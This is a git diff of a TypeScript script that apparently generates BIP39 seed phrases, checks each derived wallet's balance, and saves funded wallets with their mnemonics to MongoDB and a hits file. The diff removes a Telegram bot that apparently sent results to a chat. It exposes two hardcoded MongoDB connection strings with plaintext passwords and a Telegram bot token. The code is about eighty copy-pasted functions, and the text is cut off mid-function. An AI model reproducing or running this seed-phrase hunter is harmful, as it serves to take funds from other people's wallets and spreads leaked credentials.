@@ -4,22 +4,13 @@ import bip39 from "bip39";
 import * as fs from "fs";
 import chalk from "chalk";
 import { MongoClient } from "mongodb";
-const TelegramBot = require('node-telegram-bot-api');
 
 
 // MongoDB connection string
 const uri =
-  "mongodb+srv://officialsumesh07:89898965@huntercluster.lofcoml.mongodb.net/?retryWrites=true&w=majority&appName=HunterCluster";
+  "mongodb+srv://drxrd:23892389@cluster0.uu2znv3.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0";
 const client = new MongoClient(uri);
 const ethToUsd: any = 3000;
-const token = '6663663477:AAG0ilxTiO34leadPw-EjkVNCMeaVatLEjQ';
-const bot = new TelegramBot(token, {polling: true});
-const chatId = '-1002137245238';
-
-function sendMessageToTelegram(message) {
-  bot.sendMessage(chatId, message);
-}
-
 
 async function connectDB() {
   try {
@@ -67,7 +58,6 @@ async function getCommonData(
     await db.collection("positive_balances").insertOne(walletData);
     fs.appendFileSync("hits.txt", result + "\n", "utf-8");
   }
-  await db.collection("all_wallets").insertOne(walletData);
   fs.appendFileSync("output.txt", result + "\n", "utf-8");
 }
 
@@ -84,7 +74,7 @@ async function s1(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 
@@ -101,7 +91,7 @@ async function s2(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s3(mnemonic: string, db: any): Promise<void> {
@@ -117,7 +107,7 @@ async function s3(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s4(mnemonic: string, db: any): Promise<void> {
@@ -133,7 +123,7 @@ async function s4(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s5(mnemonic: string, db: any): Promise<void> {
@@ -149,7 +139,7 @@ async function s5(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s6(mnemonic: string, db: any): Promise<void> {
@@ -165,7 +155,7 @@ async function s6(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s7(mnemonic: string, db: any): Promise<void> {
@@ -181,7 +171,7 @@ async function s7(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s8(mnemonic: string, db: any): Promise<void> {
@@ -197,7 +187,7 @@ async function s8(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s9(mnemonic: string, db: any): Promise<void> {
@@ -213,7 +203,7 @@ async function s9(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s10(mnemonic: string, db: any): Promise<void> {
@@ -229,7 +219,7 @@ async function s10(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s11(mnemonic: string, db: any): Promise<void> {
@@ -245,7 +235,7 @@ async function s11(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s12(mnemonic: string, db: any): Promise<void> {
@@ -261,7 +251,7 @@ async function s12(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s13(mnemonic: string, db: any): Promise<void> {
@@ -277,7 +267,7 @@ async function s13(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s14(mnemonic: string, db: any): Promise<void> {
@@ -293,7 +283,7 @@ async function s14(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s15(mnemonic: string, db: any): Promise<void> {
@@ -309,7 +299,7 @@ async function s15(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s16(mnemonic: string, db: any): Promise<void> {
@@ -325,7 +315,7 @@ async function s16(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s17(mnemonic: string, db: any): Promise<void> {
@@ -341,7 +331,7 @@ async function s17(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s18(mnemonic: string, db: any): Promise<void> {
@@ -357,7 +347,7 @@ async function s18(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s19(mnemonic: string, db: any): Promise<void> {
@@ -373,7 +363,7 @@ async function s19(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s20(mnemonic: string, db: any): Promise<void> {
@@ -389,7 +379,7 @@ async function s20(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s21(mnemonic: string, db: any): Promise<void> {
@@ -405,7 +395,7 @@ async function s21(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s22(mnemonic: string, db: any): Promise<void> {
@@ -421,7 +411,7 @@ async function s22(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s23(mnemonic: string, db: any): Promise<void> {
@@ -437,7 +427,7 @@ async function s23(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s24(mnemonic: string, db: any): Promise<void> {
@@ -453,7 +443,7 @@ async function s24(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s25(mnemonic: string, db: any): Promise<void> {
@@ -469,7 +459,7 @@ async function s25(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s26(mnemonic: string, db: any): Promise<void> {
@@ -485,7 +475,7 @@ async function s26(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s27(mnemonic: string, db: any): Promise<void> {
@@ -501,7 +491,7 @@ async function s27(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s28(mnemonic: string, db: any): Promise<void> {
@@ -517,7 +507,7 @@ async function s28(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 
@@ -534,7 +524,7 @@ async function s29(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 
@@ -551,7 +541,7 @@ async function s30(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s31(mnemonic: string, db: any): Promise<void> {
@@ -567,7 +557,7 @@ async function s31(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s32(mnemonic: string, db: any): Promise<void> {
@@ -583,7 +573,7 @@ async function s32(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 
@@ -600,7 +590,7 @@ async function s33(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s34(mnemonic: string, db: any): Promise<void> {
@@ -616,7 +606,7 @@ async function s34(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s35(mnemonic: string, db: any): Promise<void> {
@@ -632,7 +622,7 @@ async function s35(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s36(mnemonic: string, db: any): Promise<void> {
@@ -648,7 +638,7 @@ async function s36(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s37(mnemonic: string, db: any): Promise<void> {
@@ -664,7 +654,7 @@ async function s37(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s38(mnemonic: string, db: any): Promise<void> {
@@ -680,7 +670,7 @@ async function s38(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s39(mnemonic: string, db: any): Promise<void> {
@@ -696,7 +686,7 @@ async function s39(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s40(mnemonic: string, db: any): Promise<void> {
@@ -712,7 +702,7 @@ async function s40(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s41(mnemonic: string, db: any): Promise<void> {
@@ -728,7 +718,7 @@ async function s41(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s42(mnemonic: string, db: any): Promise<void> {
@@ -744,7 +734,7 @@ async function s42(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s43(mnemonic: string, db: any): Promise<void> {
@@ -760,7 +750,7 @@ async function s43(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s44(mnemonic: string, db: any): Promise<void> {
@@ -776,7 +766,7 @@ async function s44(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s45(mnemonic: string, db: any): Promise<void> {
@@ -792,7 +782,7 @@ async function s45(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s46(mnemonic: string, db: any): Promise<void> {
@@ -808,7 +798,7 @@ async function s46(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s47(mnemonic: string, db: any): Promise<void> {
@@ -824,7 +814,7 @@ async function s47(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s48(mnemonic: string, db: any): Promise<void> {
@@ -840,7 +830,7 @@ async function s48(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s49(mnemonic: string, db: any): Promise<void> {
@@ -856,7 +846,7 @@ async function s49(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s50(mnemonic: string, db: any): Promise<void> {
@@ -872,7 +862,7 @@ async function s50(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s51(mnemonic: string, db: any): Promise<void> {
@@ -888,7 +878,7 @@ async function s51(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s52(mnemonic: string, db: any): Promise<void> {
@@ -904,7 +894,7 @@ async function s52(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s53(mnemonic: string, db: any): Promise<void> {
@@ -920,7 +910,7 @@ async function s53(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s54(mnemonic: string, db: any): Promise<void> {
@@ -936,7 +926,7 @@ async function s54(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s55(mnemonic: string, db: any): Promise<void> {
@@ -952,7 +942,7 @@ async function s55(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s56(mnemonic: string, db: any): Promise<void> {
@@ -968,7 +958,7 @@ async function s56(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s57(mnemonic: string, db: any): Promise<void> {
@@ -984,7 +974,7 @@ async function s57(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s58(mnemonic: string, db: any): Promise<void> {
@@ -1000,7 +990,7 @@ async function s58(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s59(mnemonic: string, db: any): Promise<void> {
@@ -1016,7 +1006,7 @@ async function s59(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s60(mnemonic: string, db: any): Promise<void> {
@@ -1032,7 +1022,7 @@ async function s60(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s61(mnemonic: string, db: any): Promise<void> {
@@ -1048,7 +1038,7 @@ async function s61(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s62(mnemonic: string, db: any): Promise<void> {
@@ -1064,7 +1054,7 @@ async function s62(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s63(mnemonic: string, db: any): Promise<void> {
@@ -1080,7 +1070,7 @@ async function s63(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s64(mnemonic: string, db: any): Promise<void> {
@@ -1096,7 +1086,7 @@ async function s64(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s65(mnemonic: string, db: any): Promise<void> {
@@ -1112,7 +1102,7 @@ async function s65(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s66(mnemonic: string, db: any): Promise<void> {
@@ -1128,7 +1118,7 @@ async function s66(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s67(mnemonic: string, db: any): Promise<void> {
@@ -1144,7 +1134,7 @@ async function s67(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s68(mnemonic: string, db: any): Promise<void> {
@@ -1160,7 +1150,7 @@ async function s68(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s69(mnemonic: string, db: any): Promise<void> {
@@ -1176,7 +1166,7 @@ async function s69(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s70(mnemonic: string, db: any): Promise<void> {
@@ -1192,7 +1182,7 @@ async function s70(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s71(mnemonic: string, db: any): Promise<void> {
@@ -1208,7 +1198,7 @@ async function s71(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s72(mnemonic: string, db: any): Promise<void> {
@@ -1224,7 +1214,7 @@ async function s72(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s73(mnemonic: string, db: any): Promise<void> {
@@ -1240,7 +1230,7 @@ async function s73(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s74(mnemonic: string, db: any): Promise<void> {
@@ -1256,7 +1246,7 @@ async function s74(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s75(mnemonic: string, db: any): Promise<void> {
@@ -1272,7 +1262,7 @@ async function s75(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s76(mnemonic: string, db: any): Promise<void> {
@@ -1288,7 +1278,7 @@ async function s76(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s77(mnemonic: string, db: any): Promise<void> {
@@ -1304,7 +1294,7 @@ async function s77(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s78(mnemonic: string, db: any): Promise<void> {
@@ -1320,7 +1310,7 @@ async function s78(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s79(mnemonic: string, db: any): Promise<void> {
@@ -1336,7 +1326,7 @@ async function s79(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
-    fs.appendFileSync("error.txt", mnemonic + "\n", "utf-8");
+    console.log('Error',error);
   }
 }
 async function s80(mnemonic: string, db: any): Promise<void> {
@@ -1352,7 +1342,7 @@ async function s80(mnemonic: string, db: any): Promise<void> {
     const transectionCount = await provider.getTransactionCount(wallet.address);
     getCommonData(balance, wallet, transectionCount, mnemonic);
   } catch (error) {
